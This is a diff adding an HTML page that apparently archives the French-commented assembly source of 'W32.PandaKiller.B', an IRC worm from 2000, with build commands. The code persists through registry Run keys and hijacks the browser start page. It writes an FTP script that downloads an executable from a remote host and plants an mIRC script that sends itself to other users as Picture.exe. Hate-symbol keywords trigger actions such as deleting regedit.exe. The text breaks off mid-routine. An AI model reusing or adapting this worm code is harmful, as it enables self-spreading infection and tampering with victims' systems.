@@ -1,0 +1,331 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>20001014 - W32.PandaKiller.B</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	color: #FF8000;
+}
+.sc3 {
+	color: #808080;
+}
+.sc4 {
+	color: #000080;
+}
+.sc5 {
+}
+.sc6 {
+	color: #0000FF;
+}
+.sc8 {
+	color: #8080FF;
+	background: #FFFFCC;
+}
+.sc9 {
+	color: #0080FF;
+}
+.sc10 {
+	color: #000080;
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment $</span><span class="sc0">
+</span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc1">;           W32.PandaKiller.B par PandaKiller le 14 octobre 2000</span><span class="sc0">
+</span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc1">; S'AUTO-COPIE DANS     : - %windir%\WinExec.exe</span><span class="sc0">
+</span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc5">DESCRIPTION</span><span class="sc4">:</span><span class="sc0">
+</span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc1">; Ce programme modifie le nom d'enregistrement en PandaKiller. Il se copie</span><span class="sc0">
+</span><span class="sc1">; dans %windir% (Dossier WINDOWS) et modifie la page de démarrage d'Internet.</span><span class="sc0">
+</span><span class="sc1">; Il crée ensuite trois fichiers :</span><span class="sc0">
+</span><span class="sc1">; - FTP.DRV : ce fichier va se connecter par FTP et télécharger un programme</span><span class="sc0">
+</span><span class="sc1">;             qui est KILL_CIH.EXE (un programme contre CIH)</span><span class="sc0">
+</span><span class="sc1">; - FTP.BAT : il va éxécuter FTP.DRV</span><span class="sc0">
+</span><span class="sc1">; - MIRC.EKP : un script pour mIRC qui permet une autoprobagation du fichier.</span><span class="sc0">
+</span><span class="sc1">;         A la connection, il active FTP.BAT et cope WINEXEC.EXE en</span><span class="sc0">
+</span><span class="sc1">;         PICTURE.EXE. Quand quelqu'un arrive, il lui envoie PICTURE.EXE</span><span class="sc0">
+</span><span class="sc1">;         *worm* il envoie également PICTURE.EXE</span><span class="sc0">
+</span><span class="sc1">;         *KKK* : déconnecte</span><span class="sc0">
+</span><span class="sc1">;         *White Power* : éteint le programme</span><span class="sc0">
+</span><span class="sc1">;         *hitler* : efface Regedit.exe</span><span class="sc0">
+</span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc1">; POUR COMPILER:</span><span class="sc0">
+</span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc1">; tasm32 /M /ML PandaKiller2.asm</span><span class="sc0">
+</span><span class="sc1">; tlink32 -Tpe -x -aa PandaKiller2.obj,,,import32</span><span class="sc0">
+</span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc1">; Lien :  www.coderz.net/matrix</span><span class="sc0">
+</span><span class="sc1">;         www.matrixvx.org</span><span class="sc0">
+</span><span class="sc1">;         www.coderz.net</span><span class="sc0">
+</span><span class="sc1">; $</span><span class="sc0">
+
+</span><span class="sc2">.386p</span><span class="sc0">
+</span><span class="sc5">locals</span><span class="sc0">
+</span><span class="sc5">jumps</span><span class="sc0">
+</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
+
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegCreateKeyExA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegSetValueExA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WinExec</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateDirectoryA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+
+
+</span><span class="sc9">.data</span><span class="sc0">
+</span><span class="sc5">moi</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">targ1</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">fh</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">octets</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">l</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">p</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">CLE</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\Software\Microsoft\Windows\CurrentVersion"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">DONNEE</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"PandaKiller"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">NOM</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"RegisteredOwner"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">CLE2</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\Software\Microsoft\Internet Explorer\Main"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">DONNEE2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"http://kadosh.multimania.com"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">NOM2</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Start Page"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">CLE3</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\Software\Microsoft\Windows\CurrentVersion\Run"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">DONNEE3</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\Win\kill_cih.exe"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">NOM3</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"killcih"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">copie1</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\WinExec.exe"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">dossier</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\Win"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">bat</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\Win\ftp.bat"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">drv</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\Win\ftp.drv"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">ini</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\Win\mirc.ekp"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">script1</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\mirc\script.ini"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">script2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\mirc32\script.ini"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">script3</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\program files\mirc\script.ini"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">script4</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\program files\mirc32\script.ini"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+
+
+
+</span><span class="sc5">batd</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"@echo off"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"start ftp -i -v -s:C:\Win\ftp.drv"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">batsize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">batd</span><span class="sc0">
+
+</span><span class="sc5">drvd</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"open"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"members.aol.com"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"pentasm99"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"cd Panda"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"binary"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"lcd C:\Win"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"get kill_cih.exe"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"bye"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"exit"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc5">drvsize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">drvd</span><span class="sc0">
+
+</span><span class="sc5">inid</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"[SCRIPT]"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n1=on 1:start:{"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n2=.remote on"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n3=.ctcps on"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n4=.events on"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n5=}"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n6=on 1:connect:{"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n7= /.copy -0 C:\Windows\WinExec.exe C:\Picture.exe"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n8= /.run -n C:\command.com start C:\Win\ftp.bat"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n9=on 1:join:#:{"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n10=if ( $nick == $ma )  {halt } .dcc send $nick C:\Picture.exe"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n11=}"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n12=on 1:text:*worm*:{"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n13=if ( $nick == $ma )  {halt } .dcc send $nick C:\Picture.exe"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n14=}"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n15=on 1:text:*KKK*:/disconnect"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n16=on 1:text:*white power*:/exit"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n17=on 1:text:*hitler*:/remove C:\Windows\regedit.exe"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc5">inisize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">inid</span><span class="sc0">
+
+</span><span class="sc9">.code</span><span class="sc0">
+</span><span class="sc5">REGISTRE</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">l</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">p</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1F0000h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CLE</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000002h</span><span class="sc0">                  </span><span class="sc1">;HKEY_LOCAL_MACHINE</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCreateKeyExA</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DONNEE</span><span class="sc0">              </span><span class="sc1">;PandaKiller</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NOM</span><span class="sc0">                 </span><span class="sc1">;DANS RegisteredOwner</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">p</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegSetValueExA</span><span class="sc0">             </span><span class="sc1">;CREE UNE VALEUR </span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">                </span><span class="sc1">;FERME LA BASE DE REGISTRE</span><span class="sc0">
+
+</span><span class="sc5">AUTO_COPIE</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">moi</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">targ1</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">copie1</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">targ1</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">targ1</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">moi</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">                  </span><span class="sc1">;%windir%\WinExec.exe</span><span class="sc0">
+
+</span><span class="sc5">CREER_DOSSIER</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dossier</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateDirectoryA</span><span class="sc0">           </span><span class="sc1">;C:\Win</span><span class="sc0">
+
+</span><span class="sc5">REGISTRE2</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">l</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">p</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1F0000h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CLE2</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000001h</span><span class="sc0">                  </span><span class="sc1">;HKEY_CURRENT_USER</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCreateKeyExA</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DONNEE2</span><span class="sc0">             </span><span class="sc1">;kadosh.multimania.com</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NOM2</span><span class="sc0">                </span><span class="sc1">;Start Page</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">p</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegSetValueExA</span><span class="sc0">             </span><span class="sc1">;CREE UNE VALEUR</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">                </span><span class="sc1">;FERME LA BASE DE REGISTRE</span><span class="sc0">
+
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">l</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">p</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1F0000h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CLE3</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000002h</span><span class="sc0">                  </span><span class="sc1">;HKEY_LOCAL_MACHINE</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCreateKeyExA</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DONNEE3</span><span class="sc0">             </span><span class="sc1">;C:\nobo.exe</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NOM3</span><span class="sc0">                </span><span class="sc1">;NOBO</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">p</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegSetValueExA</span><span class="sc0">             </span><span class="sc1">;CREE UNE VALEUR</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">                </span><span class="sc1">;FERME LA BASE DE REGISTRE</span><span class="sc0">
+
+</span><span class="sc5">FICHIER</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000080h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bat</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
+        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">fh</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">octets</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">batsize</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">batd</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fh</span><span class="sc4">]</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc0">
